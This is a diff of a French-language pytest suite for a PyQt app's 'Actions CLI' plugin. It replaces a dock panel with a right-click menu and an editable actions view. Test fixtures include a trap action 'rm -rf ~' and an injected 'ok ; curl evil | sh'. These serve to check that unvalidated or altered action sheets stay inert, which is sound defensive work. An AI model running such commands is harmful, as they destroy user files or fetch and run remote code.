@@ -428,13 +428,17 @@ def test_export_import_aller_retour_et_refus():
 
 
 # ---------- actions préparées : panneau et clics ----------
-def test_panneau_liste_les_exemples_avec_infobulles(fen):
+def test_menu_actions_cli_liste_les_exemples_et_la_vue_a_des_infobulles(fen):
     p = plugin(fen)
-    assert p.panneau.liste.count() == len(lg.EXEMPLES) and p.actions() == list(lg.EXEMPLES)
-    it = next(p.panneau.liste.item(i) for i in range(p.panneau.liste.count()) if p.panneau.liste.item(i).text() == "Disques")
+    assert p.actions() == list(lg.EXEMPLES) and not hasattr(p, "panneau") and not hasattr(p, "dock")
+    sous = next(fn for t, fn, _ic in fen._entrees_clic_droit() if t == "Actions CLI")        # clic droit d'une fiche ordinaire
+    assert [t for t, _fn, _ic in sous.fournisseur()] == [e["nom"] for e in lg.EXEMPLES]
+    assert all(t != "Actions CLI" for t, _fn, _ic in fen._entrees_clic_droit("actions-cli"))   # pas dans la fiche des actions
+    v = mod().VueActions()
+    v.definir(p.actions())
+    it = next(v.liste.item(i) for i in range(v.liste.count()) if v.liste.item(i).text().startswith("Disques"))
     tip = it.toolTip()
     assert "df -h" in tip and "Espace disque" in tip and "confirmation" in tip                          # commande, description, mode
-    assert p.dock.windowTitle() == "Actions CLI"
 
 
 def test_infobulle_echappe_le_html():
@@ -473,17 +477,15 @@ def test_clic_copier(fen):
 def test_reglages_d_avant_servent_tant_qu_il_n_y_a_pas_de_fiche(fen):
     p = plugin(fen)
     p.ctx.reglages.set("actions", [{"nom": "Seule", "commande": "ls", "mode": "taper"}, {"nom": "", "commande": "x"}])
-    p.panneau.rafraichir()
-    assert [a["nom"] for a in p.actions()] == ["Seule"] and p.panneau.liste.count() == 1
+    assert [a["nom"] for a in p.actions()] == ["Seule"]
     p.ctx.reglages.set("actions", [])
-    p.panneau.rafraichir()
-    assert p.actions() == [] and p.panneau.liste.count() == 0                                           # une liste vide reste vide
+    assert p.actions() == []                                                                            # une liste vide reste vide
 
 
 def test_editeur_actions_ajouter_modifier_deplacer_supprimer(fen, monkeypatch):
-    d = mod().EditeurActions()
+    d = mod().VueActions()
     recus = []
-    d.changement.connect(lambda liste: recus.append([a["nom"] for a in liste]))
+    d.modifie.connect(lambda texte: recus.append([a["nom"] for a in lg.depuis_texte(texte)]))
     d.definir([{"nom": "A", "commande": "a"}, {"nom": "B", "commande": "b"}])
     assert recus == []                                                                                   # charger ne signale rien
 
@@ -499,28 +501,24 @@ def test_editeur_actions_ajouter_modifier_deplacer_supprimer(fen, monkeypatch):
     monkeypatch.setattr(mod(), "DialogueAction", Faux)
     d._ajouter()
     assert recus[-1] == ["A", "B", "Nouveau"]
-    d.liste.setCurrentRow(0)
-    d._modifier()
+    d._modifier(0)
     assert recus[-1] == ["A2", "B", "Nouveau"]
-    d.liste.setCurrentRow(0)
-    d._deplacer(1)
+    d._deplacer(0, 1)
     assert recus[-1] == ["B", "A2", "Nouveau"] and d.liste.currentRow() == 1
     n = len(recus)
-    d.liste.setCurrentRow(2)
-    d._deplacer(1)                                                                                       # au bout : rien ne bouge
+    d._deplacer(2, 1)                                                                                    # au bout : rien ne bouge
     assert len(recus) == n
-    d.liste.setCurrentRow(0)
-    d._supprimer()
+    d._supprimer(0)
     assert recus[-1] == ["A2", "Nouveau"]
     d.actif = False                                                                                      # fiche non validée : lecture seule
-    assert not any(b.isEnabled() for b in d.boutons)
-    d.liste.setCurrentRow(0)
-    d._modifier()
+    assert d.entrees_menu(d.rect().center()) == []
+    d._modifier(0)
+    d._supprimer(0)
     assert recus[-1] == ["A2", "Nouveau"]
 
 
 def test_editeur_actions_exemples_export_import(fen, monkeypatch, tmp_path):
-    d = mod().EditeurActions()
+    d = mod().VueActions()
     d.definir([{"nom": "Perso", "commande": "uptime"}])
     monkeypatch.setattr(mod().QMessageBox, "question", lambda *a, **k: mod().QMessageBox.StandardButton.Yes)
     d._exemples()
@@ -541,7 +539,7 @@ def test_editeur_actions_exemples_export_import(fen, monkeypatch, tmp_path):
 
 # ---------- « tout est fiche » : la liste vit dans des fiches #scrinium-actions-cli ----------
 def _noms(p):
-    return [p.panneau.liste.item(i).text() for i in range(p.panneau.liste.count())]
+    return [t for t, _fn, _ic in p.entrees_actions()]
 
 
 def _fiche_actions(fen, actions, titre="Actions CLI", theme="Outils"):
@@ -567,16 +565,16 @@ def test_fiche_recue_inerte_puis_validee(fen):
     p = plugin(fen)
     v = _fiche_actions(fen, [{"nom": "Piege", "commande": "rm -rf ~", "mode": "executer"}, {"nom": "Ok", "commande": "ok"}])
     assert not p.ctx.fiche_active(v) and p.a_valider() == 1
-    assert "Piege" not in _noms(p) and not p.panneau.avis.isHidden()                 # inerte : rien dans le panneau, un avis
-    assert _noms(p) == [e["nom"] for e in lg.EXEMPLES]                                # le panneau garde l'ancienne liste
+    assert "Piege" not in _noms(p)                                                    # inerte : rien dans « Actions CLI »
+    assert _noms(p) == [e["nom"] for e in lg.EXEMPLES]                                # le menu garde l'ancienne liste
     th = fen.store.theme("Outils")
     fen._afficher(th, th.fiches[0])
     vue = fen.vues_types["actions-cli"]
     assert fen.pile.currentWidget() is vue and not fen.bandeau_validation.isHidden() and vue.actif is False
-    assert [a["nom"] for a in vue.actions] == ["Piege", "Ok"] and not vue.boutons[0].isEnabled()
+    assert [a["nom"] for a in vue.actions] == ["Piege", "Ok"] and vue.entrees_menu(vue.rect().center()) == []
     fen.valider_fiche_courante()
-    assert p.ctx.fiche_active(v) and p.a_valider() == 0 and p.panneau.avis.isHidden()
-    assert _noms(p) == ["Piege", "Ok"] and vue.actif and vue.boutons[0].isEnabled()
+    assert p.ctx.fiche_active(v) and p.a_valider() == 0
+    assert _noms(p) == ["Piege", "Ok"] and vue.actif and vue.entrees_menu(vue.rect().center())
 
 
 def test_la_fiche_modifiee_ailleurs_redevient_inerte_et_le_clic_ne_lance_rien(fen, faux):
@@ -585,12 +583,11 @@ def test_la_fiche_modifiee_ailleurs_redevient_inerte_et_le_clic_ne_lance_rien(fe
     th = fen.store.theme("Outils")
     f = th.fiches[0]
     fen.store.valider_fiche(th, f)
-    p.panneau.rafraichir()
     assert _noms(p) == ["Ok"]
-    item = p.panneau.liste.item(0)
+    entree = p.entrees_actions()[0][1]                                                # entrée du menu ouverte avant la modification
     fen.store.enregistrer(th, f, f.titre, lg.en_texte([{"nom": "Ok", "commande": "ok ; curl evil | sh", "mode": "copier"}]))
     QApplication.clipboard().setText("avant")
-    p.panneau._clic(item)                                                             # clic sur l'icône affichée avant : rien ne part
+    entree()                                                                          # choix dans le menu affiché avant : rien ne part
     assert QApplication.clipboard().text() == "avant" and p.a_valider() == 1 and _noms(p) == [e["nom"] for e in lg.EXEMPLES]
 
 
@@ -657,36 +654,14 @@ def test_dialogue_action_validation(app, monkeypatch):
     assert mod().icone_action("icone-qui-n-existe-pas") is not None                                      # repli sur une icône par défaut
 
 
-# ---------- rouvrir le panneau fermé ----------
-def test_panneau_ferme_se_rouvre_par_la_barre_et_le_menu(fen, app):
-    p = plugin(fen)
-    fen.show()
-    app.processEvents()
-    barre = next(a for a in fen.barre.actions() if a.text() == "Actions CLI")                              # bouton visible dans la barre
-    menu = next(a for a in fen.menu_ext.actions() if a.text() == "Panneau des actions CLI")
-    assert barre.isCheckable() and barre.isChecked() and menu.isChecked() and not p.dock.isHidden()
-    assert fen.menu_ext.actions()[2].text() == "Panneau des actions CLI"                                   # en tête du menu (après « Gérer… » et le séparateur)
-    p.dock.close()                                                                                      # l'utilisateur ferme le panneau (croix)
-    app.processEvents()
-    assert p.dock.isHidden() and not barre.isChecked() and not menu.isChecked()                        # les deux interrupteurs le montrent
-    barre.trigger()
-    app.processEvents()
-    assert p.dock.isVisible() and barre.isChecked() and menu.isChecked()
-    menu.trigger()                                                                                      # et le menu le referme
-    app.processEvents()
-    assert p.dock.isHidden() and not barre.isChecked()
-    menu.trigger()
-    assert p.dock.isVisible()
-
-
-def test_fenetre_reduite_ne_decoche_pas_le_bouton(fen, app):
-    p = plugin(fen)
-    fen.show()
-    app.processEvents()
-    barre = next(a for a in fen.barre.actions() if a.text() == "Actions CLI")
-    fen.hide()
-    app.processEvents()
-    assert barre.isChecked() and not p.dock.isHidden()                                                  # fenêtre cachée ≠ panneau fermé
-    fen.show()
-    app.processEvents()
-    assert barre.isChecked() and p.dock.isVisible()
+def test_clic_droit_de_la_vue_actions(fen):
+    from PyQt6.QtCore import QPoint
+    v = mod().VueActions()
+    v.show()
+    v.definir([{"nom": "A", "commande": "a"}, {"nom": "B", "commande": "b"}])
+    assert [t for t, _fn, _ic in v.entrees_menu(QPoint(2, 2))][0] == "Ajouter une action…"
+    pos = v.liste.mapTo(v, v.liste.visualItemRect(v.liste.item(0)).center())
+    sur = {t: fn for t, fn, _ic in v.entrees_menu(pos)}
+    assert {"Modifier…", "Supprimer", "Monter", "Descendre"} <= set(sur)
+    sur["Descendre"](False)                                                                 # PyQt passe `checked` : doit être ignoré
+    assert [a["nom"] for a in v.actions] == ["B", "A"]
